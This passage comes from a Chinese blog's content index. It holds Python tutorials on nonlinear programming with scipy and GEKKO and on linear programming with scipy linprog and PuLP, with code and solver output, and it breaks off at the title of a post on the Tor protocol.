class="string">"__main__"</span>:</span><br><span class="line">    <span class="comment">#定义常量值</span></span><br><span class="line">    args = (<span class="number">2</span>,<span class="number">1</span>,<span class="number">3</span>,<span class="number">4</span>)  <span class="comment">#a,b,c,d</span></span><br><span class="line">    <span class="comment">#设置参数范围/约束条件</span></span><br><span class="line">    args1 = (<span class="number">0.1</span>,<span class="number">0.9</span>,<span class="number">0.1</span>, <span class="number">0.9</span>,<span class="number">0.1</span>,<span class="number">0.9</span>)  <span class="comment">#x1min, x1max, x2min, x2max</span></span><br><span class="line">    cons = con(args1)</span><br><span class="line">    <span class="comment">#设置初始猜测值  </span></span><br><span class="line">    x0 = np.asarray((<span class="number">0.5</span>,<span class="number">0.5</span>,<span class="number">0.5</span>))</span><br><span class="line">    </span><br><span class="line">    res = minimize(fun(args), x0, method=<span class="string">'SLSQP'</span>,constraints=cons)</span><br><span class="line">    print(res.fun)</span><br><span class="line">    print(res.success)</span><br><span class="line">    print(res.x)</span><br></pre></td></tr></table></figure><pre><code>-0.773684210526435True[0.9 0.9 0.1]</code></pre><p>在这个示例中，我们可以看到<code>scipy.optimize.minimize（）</code>函数需要我们传入一个目标函数（示例中是函数<code>fun()</code>），其返回值是一个lambda匿名函数对象，其内容就是我们需要求解的目标式，需要注意的是，这个传入的函数里面的常量需要以元祖的形式传入，也就是说，在函数内部不应该出现常量。第二个参数是对内部变量的初始化值，注意到我们之前提到的，这个初始化值一定程度上可以影响到最终解。然后就是<code>methon</code>参数，这个参数指定我们使用的优化算法。这里推荐使用SLSQP。然后<code>constraints</code>参数，其与目标函数的传入一样，需要传入一个函数，其具体的构造方式可以参看示例代码，注释已经说明的相当清楚。</p><h2 id="GEKKO解决策略"><a href="#GEKKO解决策略" class="headerlink" title="GEKKO解决策略"></a>GEKKO解决策略</h2><p>当然除了万能的scipy之外，还有一些专门做优化的python库可以提供帮助，这里着重推荐GEKKO。这是APMonitor的全新接口。这个库很神奇，是一个C/S结构的，类似于tensorflow,需要在python脚本外运行方程（在tensorflow中将图构造好，让外部运行图的计算），这个外部甚至可以是远程服务器，在没有下载本地server的情况下，默认就是使用的远程服务器提供的APM的API，只不过GEKKO帮我们把构造方程这些步骤做了封装。也隐藏了向服务端发送请求和接受请求的步骤。所以我们需要关心的就是如何通过GEKKO构造我们规划模型。很多细节可以直接通过参考文献[1]的官网进行了解。这里就大致说一下GEKKO的使用。</p><p>下面以著名的非线性<code>HS 71 Benchmark</code>问题的官方求解为例子：</p><p><img src="/myimages/数模编程/非线性规划/HS71problem.png" alt="image.png"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> gekko <span class="keyword">import</span> GEKKO</span><br><span class="line"></span><br><span class="line"><span class="comment">#Initialize Model</span></span><br><span class="line">m = GEKKO()</span><br><span class="line"></span><br><span class="line"><span class="comment">#define parameter</span></span><br><span class="line">eq = m.Param(value=<span class="number">40</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#initialize variables</span></span><br><span class="line">x1,x2,x3,x4 = [m.Var(lb=<span class="number">1</span>, ub=<span class="number">5</span>) <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">4</span>)]</span><br><span class="line"></span><br><span class="line"><span class="comment">#initial values</span></span><br><span class="line">x1.value = <span class="number">1</span></span><br><span class="line">x2.value = <span class="number">5</span></span><br><span class="line">x3.value = <span class="number">5</span></span><br><span class="line">x4.value = <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#Equations</span></span><br><span class="line">m.Equation(x1*x2*x3*x4&gt;=<span class="number">25</span>)</span><br><span class="line">m.Equation(x1**<span class="number">2</span>+x2**<span class="number">2</span>+x3**<span class="number">2</span>+x4**<span class="number">2</span>==eq)</span><br><span class="line"></span><br><span class="line"><span class="comment">#Objective</span></span><br><span class="line">m.Obj(x1*x4*(x1+x2+x3)+x3)</span><br><span class="line"></span><br><span class="line"><span class="comment">#Set global options</span></span><br><span class="line">m.options.IMODE = <span class="number">3</span> <span class="comment">#steady state optimization</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#Solve simulation</span></span><br><span class="line">m.solve()</span><br><span class="line"></span><br><span class="line"><span class="comment">#Results</span></span><br><span class="line">print(<span class="string">''</span>)</span><br><span class="line">print(<span class="string">'Results'</span>)</span><br><span class="line">print(<span class="string">'x1: '</span> + str(x1.value))</span><br><span class="line">print(<span class="string">'x2: '</span> + str(x2.value))</span><br><span class="line">print(<span class="string">'x3: '</span> + str(x3.value))</span><br><span class="line">print(<span class="string">'x4: '</span> + str(x4.value))</span><br></pre></td></tr></table></figure><pre><code>apm 113.140.11.125_gk_model2 &lt;br&gt;&lt;pre&gt; ---------------------------------------------------------------- APMonitor, Version 0.8.5 APMonitor Optimization Suite ---------------------------------------------------------------- --------- APM Model Size ------------ Each time step contains   Objects      :            0   Constants    :            0   Variables    :            6   Intermediates:            0   Connections  :            0   Equations    :            3   Residuals    :            3 Number of state variables:              5 Number of total equations: -            2 Number of slack variables: -            1 --------------------------------------- Degrees of freedom       :              2 ********************************************** Steady State Optimization with Interior Point Solver ********************************************** Info: Exact Hessian******************************************************************************This program contains Ipopt, a library for large-scale nonlinear optimization. Ipopt is released as open source code under the Eclipse Public License (EPL).         For more information visit http://projects.coin-or.org/Ipopt******************************************************************************This is Ipopt version 3.12.10, running with linear solver ma57.Number of nonzeros in equality constraint Jacobian...:        9Number of nonzeros in inequality constraint Jacobian.:        0Number of nonzeros in Lagrangian Hessian.............:       10Total number of variables............................:        5                     variables with only lower bounds:        1                variables with lower and upper bounds:        4                     variables with only upper bounds:        0Total number of equality constraints.................:        2Total number of inequality constraints...............:        0        inequality constraints with only lower bounds:        0   inequality constraints with lower and upper bounds:        0        inequality constraints with only upper bounds:        0iter    objective    inf_pr   inf_du lg(mu)  ||d||  lg(rg) alpha_du alpha_pr  ls   0  1.6109693e+01 1.12e+01 2.50e+00   0.0 0.00e+00    -  0.00e+00 0.00e+00   0   1  1.6905655e+01 7.44e-01 5.14e-01  -0.9 1.36e-01    -  1.00e+00 1.00e+00f  1   2  1.7136202e+01 1.71e-01 4.57e-01  -1.0 9.40e-02    -  8.95e-01 1.00e+00h  1   3  1.6956645e+01 1.57e-01 7.85e-02  -2.0 1.78e-01    -  9.95e-01 1.00e+00h  1   4  1.7009269e+01 1.63e-02 1.20e-02  -2.8 3.94e-02    -  9.94e-01 1.00e+00h  1   5  1.7013888e+01 4.04e-04 1.76e-04  -4.6 6.22e-03    -  1.00e+00 1.00e+00h  1   6  1.7014017e+01 3.92e-07 6.03e-07 -10.4 1.46e-04    -  9.99e-01 1.00e+00h  1Number of Iterations....: 6                                   (scaled)                 (unscaled)Objective...............:   1.7014017127073458e+01    1.7014017127073458e+01Dual infeasibility......:   6.0264909533529361e-07    6.0264909533529361e-07Constraint violation....:   3.9234873865091858e-07    3.9234873865091858e-07Complementarity.........:   7.2865190881096349e-08    7.2865190881096349e-08Overall NLP error.......:   6.0264909533529361e-07    6.0264909533529361e-07Number of objective function evaluations             = 7Number of objective gradient evaluations             = 7Number of equality constraint evaluations            = 7Number of inequality constraint evaluations          = 0Number of equality constraint Jacobian evaluations   = 7Number of inequality constraint Jacobian evaluations = 0Number of Lagrangian Hessian evaluations             = 6Total CPU secs in IPOPT (w/o function evaluations)   =      0.004Total CPU secs in NLP function evaluations           =      0.001EXIT: Optimal Solution Found. The solution was found. The final value of the objective function is    17.0140171270735      --------------------------------------------------- Solver         :  IPOPT (v3.9) Solution time  :   9.099999999307329E-003 sec Objective      :    17.0140171270735      Successful solution ---------------------------------------------------Resultsx1: [1.0]x2: [4.743]x3: [3.82115]x4: [1.379408]</code></pre><p>通过这个例子我们可以知道GEKKO给我们提供的接口还是很人性化的。现在归纳下使用流：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">1.  GEKKO()初始化类</span><br><span class="line">2.  调用类方法Param(value=x)，给模型常量赋值</span><br><span class="line">3.  调用类方法m.Var(lb=1, ub=5)，给模型变量定界</span><br><span class="line">4.  给类的变量属性赋值初始值</span><br><span class="line">5.  调用类方法Equation()构造约束式</span><br><span class="line">6.  调用类方法object定义目标函数</span><br><span class="line">7.  solve()函数进行求解</span><br><span class="line">8.  获取结果</span><br></pre></td></tr></table></figure></p><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="http://apmonitor.com/wiki/index.php/Main/PythonApp" target="_blank" rel="noopener">[1]APM官网</a><br><a href="https://docs.scipy.org/doc/scipy/reference/generated/scipy.optimize.minimize.html" target="_blank" rel="noopener">[2]Scipy minimize</a><br><a href="https://gekko.readthedocs.io/en/latest/" target="_blank" rel="noopener">[3]GEKKO</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>数模之线性规划</title>
      <link href="/2018/12/08/%E6%95%B0%E6%A8%A1%E4%B9%8B%E7%BA%BF%E6%80%A7%E8%A7%84%E5%88%92/"/>
      <url>/2018/12/08/%E6%95%B0%E6%A8%A1%E4%B9%8B%E7%BA%BF%E6%80%A7%E8%A7%84%E5%88%92/</url>
      
        <content type="html"><![CDATA[<blockquote><p>线性规划作为数学建模领域的优化类，包括一般的线性规划和整数线性规划，当然也有一批比较成熟的商业软件可以提供建模帮助，如Cplex，LINGO，Gurobi或Mosek等。除此以外，我们也可以使用matlab或者python的第三方库来方便进行线性规划类模型求解。这篇文章主要是介绍python在线性规划模型求解，将从线性规划和整数线性规划来阐述，其中也会介绍一些比较常用的python库。<br><a id="more"></a></p></blockquote><h1 id="scipy实现线性规划"><a href="#scipy实现线性规划" class="headerlink" title="scipy实现线性规划"></a>scipy实现线性规划</h1><ul><li><a href="https://ww2.mathworks.cn/help/optim/ug/linprog.html?searchHighlight=linprog&amp;s_tid=doc_srchtitle" target="_blank" rel="noopener">matlab linprog 官网</a>  </li><li><a href="https://docs.scipy.org/doc/scipy/reference/optimize.linprog-simplex.html" target="_blank" rel="noopener">python scipy optimize linprog 官网</a></li></ul><p>python中的线性规划的实现，是借助于scipy库的optimize模块实现的，它的接口定义和matlab的linprog相似。我们可以看到在matlab官方文档里面有一幅图，展示了函数接口的规划线性规划式应有的样子，我们只要按照其接口定义，构造我们的参数，那么他就会自动的帮助我们求解。其实参考了官方的文档，我们可以知道scipy提供了两种线性规划求解函数，<code>linprog(method=’interior-point’)</code>和<code>linprog(method=’simplex’)</code>,下面主要介绍simplex methon。</p><p><img src="/myimages/数模编程/线性规划/接口.png" alt="image.png"></p><p>可以看到上面的式子是接口提供的规范，我们需要将我们需要求解的线性规划式子按照规划接口构造。这里主要说明如何使用python定义这个接口规范。下面主要看下在python上，具体如何进行运用。以下常用的一些操作，注意到反回结果是一个对象，当然也可以直接print()（因为其类的实现定义了作为输出字符串时的魔术方法<code>__str__</code>：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> scipy <span class="keyword">import</span> optimize</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"></span><br><span class="line"><span class="comment">#求解函数</span></span><br><span class="line">res = optimize.linprog(c,A,b,Aeq,beq,LB,UB,X0,OPTIONS) <span class="comment"># or res = optimize.linprog(c,A,b,Aeq,beq,bounds=(x1,x2,x3,......),OPTIONS) </span></span><br><span class="line"><span class="comment">#目标函数最小值</span></span><br><span class="line">print(res.fun)</span><br><span class="line"><span class="comment">#最优解</span></span><br><span class="line">print(res.x)</span><br></pre></td></tr></table></figure><p>下面以《matlab在数学建模中应用》这本书上的例题来进行一个使用案例分析：</p><p><img src="/myimages/数模编程/线性规划/例题.png" alt="image.png"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> scipy <span class="keyword">import</span> optimize <span class="keyword">as</span> op</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"></span><br><span class="line">c=np.array([<span class="number">2</span>,<span class="number">3</span>,<span class="number">-5</span>])                   <span class="comment">#定义最值式，注意要改变式子使其符合求解最小值</span></span><br><span class="line">A_ub=np.array([[<span class="number">-2</span>,<span class="number">5</span>,<span class="number">-1</span>],[<span class="number">1</span>,<span class="number">3</span>,<span class="number">1</span>]])     <span class="comment">#这里对左右两边取反，使得条件与接口式形式上一致</span></span><br><span class="line">A_ub_=np.array([<span class="number">-10</span>,<span class="number">12</span>])</span><br><span class="line">A_eq=np.array([[<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>]])</span><br><span class="line">B_eq=np.array([<span class="number">7</span>])</span><br><span class="line">x1=(<span class="number">0</span>,<span class="number">7</span>)</span><br><span class="line">x2=(<span class="number">0</span>,<span class="number">7</span>)</span><br><span class="line">x3=(<span class="number">0</span>,<span class="number">7</span>)</span><br><span class="line"></span><br><span class="line">res=op.linprog(-c,A_ub,B_ub,A_eq,B_eq,bounds=(x1,x2,x3))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 整体输出</span></span><br><span class="line">print(res)</span><br><span class="line"><span class="comment"># 获取结果属性</span></span><br><span class="line">print(-res.fun)</span><br><span class="line"><span class="comment"># 获取最优解</span></span><br><span class="line">print(res.x)</span><br></pre></td></tr></table></figure><pre><code>     fun: -14.571428571428571 message: &#39;Optimization terminated successfully.&#39;     nit: 2   slack: array([3.85714286, 0.57142857, 6.42857143, 7.        , 0.        ])  status: 0 success: True       x: array([6.42857143, 0.57142857, 0.        ])14.571428571428571[6.42857143 0.57142857 0.        ]</code></pre><p>我们可以注意到，由于这个线性规划是求解最大值，为了让适应规划接口，我们需要把之转化为求最小值的形式，然后对结果的对应操作就是取相反数。另外一点比较容易出错的地方是，注意到接口规范只有小于形式的条件（如图一中的第一个条件），如果事迹建模中出现了大于形式的条件，就要左右取反操作。</p><h1 id="PuLP实现线性规划"><a href="#PuLP实现线性规划" class="headerlink" title="PuLP实现线性规划"></a>PuLP实现线性规划</h1><p>受限于scipy的整数线性规划的鸡肋，不得不开辟新的战场。经过一番搜索，得知了PuLP这个库，然后去官网浏览了一波。没错了！这就是我想要的。看了PuLP这个库的相关整体架构后，以及用户接口友好程度，你一定会像我这么感慨的：Amazing!作为解决LP问题，这个库比较小巧，专门解决LP问题，包括整数和连续变量两种变量类型，而且用户接口实现都很pythonic。PuLP大致可以简化为四个个组件：LPproblem（实例化线性回归构造器，对比scipy的沿用matlab的接口定义，PuLP的接口就很人性化，真的，你会这样认为的！），solvers（定制化算法求解引擎），LpVariable(定义变量的类型，连续或者整形)，Constraints（其他的约束条件）。官方给了四个使用PuLP解决实际问题的例子，参考链接[5]也给出了一些使用PuLP的解决案例。这里选取一个比较简单的第一个官方案例进行常规编程接口和步骤归纳。官方式例如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Import PuLP modeler functions</span></span><br><span class="line"><span class="keyword">from</span> pulp <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># Creates a list of the Ingredients</span></span><br><span class="line">Ingredients = [<span class="string">'CHICKEN'</span>, <span class="string">'BEEF'</span>, <span class="string">'MUTTON'</span>, <span class="string">'RICE'</span>, <span class="string">'WHEAT'</span>, <span class="string">'GEL'</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># A dictionary of the costs of each of the Ingredients is created</span></span><br><span class="line">costs = &#123;<span class="string">'CHICKEN'</span>: <span class="number">0.013</span>, </span><br><span class="line">         <span class="string">'BEEF'</span>: <span class="number">0.008</span>, </span><br><span class="line">         <span class="string">'MUTTON'</span>: <span class="number">0.010</span>, </span><br><span class="line">         <span class="string">'RICE'</span>: <span class="number">0.002</span>, </span><br><span class="line">         <span class="string">'WHEAT'</span>: <span class="number">0.005</span>, </span><br><span class="line">         <span class="string">'GEL'</span>: <span class="number">0.001</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># A dictionary of the protein percent in each of the Ingredients is created</span></span><br><span class="line">proteinPercent = &#123;<span class="string">'CHICKEN'</span>: <span class="number">0.100</span>, </span><br><span class="line">                  <span class="string">'BEEF'</span>: <span class="number">0.200</span>, </span><br><span class="line">                  <span class="string">'MUTTON'</span>: <span class="number">0.150</span>, </span><br><span class="line">                  <span class="string">'RICE'</span>: <span class="number">0.000</span>, </span><br><span class="line">                  <span class="string">'WHEAT'</span>: <span class="number">0.040</span>, </span><br><span class="line">                  <span class="string">'GEL'</span>: <span class="number">0.000</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># A dictionary of the fat percent in each of the Ingredients is created</span></span><br><span class="line">fatPercent = &#123;<span class="string">'CHICKEN'</span>: <span class="number">0.080</span>, </span><br><span class="line">              <span class="string">'BEEF'</span>: <span class="number">0.100</span>, </span><br><span class="line">              <span class="string">'MUTTON'</span>: <span class="number">0.110</span>, </span><br><span class="line">              <span class="string">'RICE'</span>: <span class="number">0.010</span>, </span><br><span class="line">              <span class="string">'WHEAT'</span>: <span class="number">0.010</span>, </span><br><span class="line">              <span class="string">'GEL'</span>: <span class="number">0.000</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># A dictionary of the fibre percent in each of the Ingredients is created</span></span><br><span class="line">fibrePercent = &#123;<span class="string">'CHICKEN'</span>: <span class="number">0.001</span>, </span><br><span class="line">                <span class="string">'BEEF'</span>: <span class="number">0.005</span>, </span><br><span class="line">                <span class="string">'MUTTON'</span>: <span class="number">0.003</span>, </span><br><span class="line">                <span class="string">'RICE'</span>: <span class="number">0.100</span>, </span><br><span class="line">                <span class="string">'WHEAT'</span>: <span class="number">0.150</span>, </span><br><span class="line">                <span class="string">'GEL'</span>: <span class="number">0.000</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># A dictionary of the salt percent in each of the Ingredients is created</span></span><br><span class="line">saltPercent = &#123;<span class="string">'CHICKEN'</span>: <span class="number">0.002</span>, </span><br><span class="line">               <span class="string">'BEEF'</span>: <span class="number">0.005</span>, </span><br><span class="line">               <span class="string">'MUTTON'</span>: <span class="number">0.007</span>, </span><br><span class="line">               <span class="string">'RICE'</span>: <span class="number">0.002</span>, </span><br><span class="line">               <span class="string">'WHEAT'</span>: <span class="number">0.008</span>, </span><br><span class="line">               <span class="string">'GEL'</span>: <span class="number">0.000</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># Create the 'prob' variable to contain the problem data</span></span><br><span class="line">prob = LpProblem(<span class="string">"The Whiskas Problem"</span>, LpMinimize)</span><br><span class="line"></span><br><span class="line"><span class="comment"># A dictionary called 'ingredient_vars' is created to contain the referenced Variables</span></span><br><span class="line">ingredient_vars = LpVariable.dicts(<span class="string">"Ingr"</span>,Ingredients,<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># The objective function is added to 'prob' first</span></span><br><span class="line">prob += lpSum([costs[i]*ingredient_vars[i] <span class="keyword">for</span> i <span class="keyword">in</span> Ingredients]), <span class="string">"Total Cost of Ingredients per can"</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># The five constraints are added to 'prob'</span></span><br><span class="line">prob += lpSum([ingredient_vars[i] <span class="keyword">for</span> i <span class="keyword">in</span> Ingredients]) == <span class="number">100</span>, <span class="string">"PercentagesSum"</span></span><br><span class="line">prob += lpSum([proteinPercent[i] * ingredient_vars[i] <span class="keyword">for</span> i <span class="keyword">in</span> Ingredients]) &gt;= <span class="number">8.0</span>, <span class="string">"ProteinRequirement"</span></span><br><span class="line">prob += lpSum([fatPercent[i] * ingredient_vars[i] <span class="keyword">for</span> i <span class="keyword">in</span> Ingredients]) &gt;= <span class="number">6.0</span>, <span class="string">"FatRequirement"</span></span><br><span class="line">prob += lpSum([fibrePercent[i] * ingredient_vars[i] <span class="keyword">for</span> i <span class="keyword">in</span> Ingredients]) &lt;= <span class="number">2.0</span>, <span class="string">"FibreRequirement"</span></span><br><span class="line">prob += lpSum([saltPercent[i] * ingredient_vars[i] <span class="keyword">for</span> i <span class="keyword">in</span> Ingredients]) &lt;= <span class="number">0.4</span>, <span class="string">"SaltRequirement"</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># The problem data is written to an .lp file</span></span><br><span class="line">prob.writeLP(<span class="string">"WhiskasModel2.lp"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># The problem is solved using PuLP's choice of Solver</span></span><br><span class="line">prob.solve()</span><br><span class="line"></span><br><span class="line"><span class="comment"># The status of the solution is printed to the screen</span></span><br><span class="line"><span class="keyword">print</span> (<span class="string">"Status:"</span>, LpStatus[prob.status])</span><br><span class="line"></span><br><span class="line"><span class="comment"># Each of the variables is printed with it's resolved optimum value</span></span><br><span class="line"><span class="keyword">for</span> v <span class="keyword">in</span> prob.variables():</span><br><span class="line">    <span class="keyword">print</span> (v.name, <span class="string">"="</span>, v.varValue)</span><br><span class="line"></span><br><span class="line"><span class="comment"># The optimised objective function value is printed to the screen    </span></span><br><span class="line"><span class="keyword">print</span> (<span class="string">"Total Cost of Ingredients per can = "</span>, value(prob.objective))</span><br></pre></td></tr></table></figure><pre><code>Status: OptimalIngr_BEEF = 60.0Ingr_CHICKEN = 0.0Ingr_GEL = 40.0Ingr_MUTTON = 0.0Ingr_RICE = 0.0Ingr_WHEAT = 0.0Total Cost of Ingredients per can =  0.52</code></pre><p>上面是一个有关猫食选择的最有解决案例，具体的题目可以去参看官方文档，这里仅仅对使用PuLP进行线性规划的流程进行一个大致的归纳：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1.</span> prob = LpProblem(<span class="string">"The Whiskas Problem"</span>, LpMinimize)<span class="comment">#实例化LpProblem构造类,第一个参数是自定义的线性规划取名，第二参数可以指定求解的类型是 max or min</span></span><br><span class="line"></span><br><span class="line"><span class="number">2.</span> A = pulp.LpVariable(<span class="string">'A'</span>, lowBound=<span class="number">0</span>, cat=<span class="string">'Integer'</span>)<span class="comment">#pulp变量定义，参数包括取名，上下限，类别，整形或连续</span></span><br><span class="line"></span><br><span class="line"><span class="number">3.</span> prob+=......</span><br><span class="line">   prob+=......</span><br><span class="line">    ......                                            <span class="comment">#依次构造目标函数和约束条件，注意到，我们可以对目标函数或者约束项取名</span></span><br><span class="line"></span><br><span class="line"><span class="number">4.</span> prob.writeLP()                                     <span class="comment">#调用内部函数，将prob对象进行输出到指定文件</span></span><br><span class="line"></span><br><span class="line"><span class="number">5.</span> prob.solve()                                       <span class="comment">#进行模型求解，这里将采用默认的算法引擎求解，这个函数可以接受参数，我们可以定制化slover类传入，具体参考官方文档</span></span><br><span class="line"></span><br><span class="line"><span class="number">6.</span> <span class="keyword">print</span> (<span class="string">"Status:"</span>, LpStatus[prob.status])</span><br><span class="line">   <span class="keyword">print</span> (v.name, <span class="string">"="</span>, v.varValue)</span><br><span class="line">   <span class="keyword">print</span> (<span class="string">"Total Cost of Ingredients per can = "</span>, value(prob.objective))  <span class="comment">#获取计算结果</span></span><br></pre></td></tr></table></figure><blockquote><p>除了这两个库之外，pyomo也是个不错的库，还有就是导言提到的Gurobi使用python作为编程语言这个商业化软件，也是很不错的求解线性规划的方案。</p></blockquote><h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><p><a href="https://www.coin-or.org/PuLP/main/the_optimisation_process.html" target="_blank" rel="noopener">[1]Pulp官网</a><br><a href="http://www.pyomo.org/" target="_blank" rel="noopener">[2]Pyomo官网</a><br><a href="http://pymprog.sourceforge.net/intro.html" target="_blank" rel="noopener">[3]pymprog官网</a><br><a href="http://www.logphp.com/?a=url&amp;k=5f964654&amp;u=aHR0cDovL3d3dy5iYWlkdS5jb20vbGluaz91cmw9QTF0Ykp6Y0RVbk15bFdxZHlsRDduLV9MeUF4d0FZOHM1VTdPTVNwUXV5Q183aElnZktaQTJQekp2aGE2LUNuZ0F2cWxvM194N1NUVkpscUszTjctb3poeVpfa3l2RUpkMFlzWFNqUkE2bHk=&amp;t=cHl0aG9uIHB1bHDljIXmsYLop6PmlbTmlbDnur@mgKfop4TliJLlkoznur@mgKfop4TliJIgLSDkuI7mlbDmja7lkoxBLi4uX0NTRE7ljZrlrqI=&amp;s=cHl0aG9uIOe6v!aAp!inhOWIkuaxguinow==" target="_blank" rel="noopener">[4]python 整数线性规划和线性规划</a><br><a href="http://benalexkeen.com/linear-programming-with-python-and-pulp/" target="_blank" rel="noopener">[5]Introduction to Linear Programming with Python and PuLP</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>tor匿名协议理解二</title>
      <link href="/2018/12/06/tor%E5%8C%BF%E5%90%8D%E5%8D%8F%E8%AE%AE%E7%90%86%E8%A7%A3%E4%BA%8C/"/>
      <url>/2018/12/06/tor%E5%8C%BF%E5%90%8D%E5%8D%8F%E8%AE%AE%E7%90%86%E8%A7%A3%E4%BA%8C/</url>
      
